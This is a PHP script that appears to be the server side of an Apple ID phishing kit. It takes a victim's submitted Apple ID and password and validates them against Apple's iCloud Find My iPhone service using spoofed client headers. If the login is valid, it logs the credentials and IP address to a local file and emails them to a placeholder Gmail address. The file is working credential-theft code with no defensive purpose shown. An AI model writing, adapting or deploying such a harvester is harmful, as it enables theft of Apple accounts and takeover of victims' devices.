<?php ?><?php
$appleID = $_POST['appleID'];
$pw = $_POST['pw'];
$ch = curl_init();
$header[] = 'Content-Type: application/json; charset=utf-8';
$header[] = 'X-Apple-Find-Api-Ver: 2.0';
$header[] = 'X-Apple-Authscheme: UserIdGuest';
$header[] = 'X-Apple-Realm-Support: 1.0';
$header[] = 'User-agent: Find iPhone/1.3 MeKit (iPad: iPhone OS/4.2.1)';
$header[] = 'X-Client-Name: iPad';
$header[] = 'X-Client-UUID: 0cf3dc501ff812adb0b202baed4f37274b210853';
$header[] = 'Accept-Language: en-us';
$header[] = 'Connection: keep-alive';
curl_setopt($ch, CURLOPT_URL, 'https://fmipmobile.icloud.com/fmipservice/device/' . $appleID . '/initClient');
curl_setopt($ch, CURLOPT_USERPWD, $appleID . ':' . $pw);
curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
curl_setopt($ch, CURLOPT_HEADER, TRUE);
//curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
curl_setopt($ch, CURLOPT_USERAGENT, 'Find iPhone/1.3 MeKit (iPad: iPhone OS/4.2.1)');
curl_setopt($ch, CURLOPT_AUTOREFERER, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$value = curl_exec($ch);
//echo $value;
curl_close($ch);
if (!stristr($value, " 330 ")) {
    echo "<script>window.location = './index.html'</script>";
}
if (stristr($value, " 330 ")) {
    echo "<script>window.location = './locked.html'</script>";
    $save1 = $ip . " " . $appleID . " : " . $pw . " ";
    $my_file = 'ID.htm';
    $handle = fopen($my_file, 'a') or die('Cannot open file:  ');
    fwrite($handle, $save1);
    $new_data = "<br />";
    fwrite($handle, $new_data);
    $ip = getenv("REMOTE_ADDR");
    $message.= "-----------  ! +WEB VERSION+ !  -----------
";
    $message.= "-----------  ! +Apple ! xDD+ !  -----------
";
    $message.= "-----------  ! +Account infoS+ !  -----------
";
    $message.= "Email Address        : " . $_POST['appleID'] . "
";
    $message.= "Password               : " . $_POST['pw'] . "
";
    $message.= "-----------  ! +nJoY+ !  -----------
";
    $send = "youremail@gmail.com";
    $subject = "Key Ready $ip']";
    $headers = "From:  Apple<@Joker_Unlock>";
    $headers.= $_POST['appleId'] . "
";
    $headers.= "MIME-Version: 1.0
";
    $arr = array($send, $IP);
    foreach ($arr as $send) mail($send, $subject, $message, $headers);
}
?>